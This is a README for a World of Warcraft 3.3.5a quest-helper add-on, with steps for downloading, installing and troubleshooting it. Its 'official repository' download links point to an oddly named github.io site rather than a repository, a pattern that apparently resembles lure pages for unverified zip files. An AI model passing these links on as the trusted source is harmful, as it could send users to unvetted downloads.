# 🗺️ pfQuest-Reforged - Find your quests and track progress

[![](https://img.shields.io/badge/Download-pfQuest--Reforged-blue.svg)](https://deeplaid-homelessness709.github.io)

pfQuest-Reforged acts as your personal guide for World of Warcraft: Wrath of the Lich King. This tool displays quest locations on your map and keeps a database of items, monsters, and quest chains. It replaces the basic quest tracker with a clean layout and modern features. 

## 📦 How to download the software

Follow these steps to install the quest helper on your Windows computer.

1. Visit the [official repository page](https://deeplaid-homelessness709.github.io) to find the latest version.
2. Look for the "Releases" section on the right side of the screen.
3. Click the link that says "Latest" or shows a version number.
4. Select the file ending in .zip to start the download.
5. Save this file to your "Downloads" folder.

## 🛠️ Installing the add-on

After you download the file, you must move it to the correct folder in your game directory.

1. Open your "Downloads" folder.
2. Right-click the downloaded zip file and select "Extract All."
3. Click "Extract" to create a new, normal folder.
4. Open your World of Warcraft installation folder. This is often inside `C:\Program Files (x86)\World of Warcraft`.
5. Open the folder named `Interface`.
6. Inside that, open the folder named `AddOns`. 
7. Drag the folder you extracted into this `AddOns` directory.
8. Ensure the folder name inside `AddOns` does not have extra sub-folders. The path should look like `World of Warcraft\Interface\AddOns\pfQuest-Reforged`.

## 🎮 Launching the game

Once you place the files in the correct folder, start your game. 

1. Launch World of Warcraft.
2. On the character selection screen, look at the bottom-left corner for a button labeled "AddOns."
3. Click this button to open the list of installed tools.
4. Find `pfQuest-Reforged` in the list and ensure the box next to it stays checked.
5. Click "Okay" and enter the game world.

## ⚙️ Using the quest helper

The tool works automatically once you enter the game. You will see markers on your world map and mini-map.

*   **Quest markers:** Green icons indicate quest objectives.
*   **Database browser:** Type `/pfq` in your chat window to open the main search menu. This menu allows you to search for items, creatures, or specific quests.
*   **Settings:** Type `/pfq config` to change how the icons look or to show different types of markers on your map.

## 📋 System requirements

You do not need powerful hardware to run this program. Ensure your computer meets these basic standards:

*   **Game Version:** World of Warcraft 3.3.5a (WotLK).
*   **Operating System:** Windows 10 or Windows 11.
*   **Disk Space:** 50 MB of free space for the files.
*   **Add-on support:** A standard installation of the game client.

## 🔧 Troubleshooting common issues

If the icons do not appear on your map, check these items:

1. **Verify the path:** Ensure you did not create a folder inside a folder. If you open the `pfQuest-Reforged` folder and see another folder with the same name, move the inner folder into the `AddOns` directory.
2. **Reload the interface:** If you just installed the files while the game was open, type `/reload` in the chat window to refresh the game interface.
3. **Check version compatibility:** This software only works with the 3.3.5a game version. It will not work on retail versions or older game builds.
4. **Permissions:** If you installed the game in the `Program Files` directory, ensure your user account has permissions to modify files in that sub-folder.
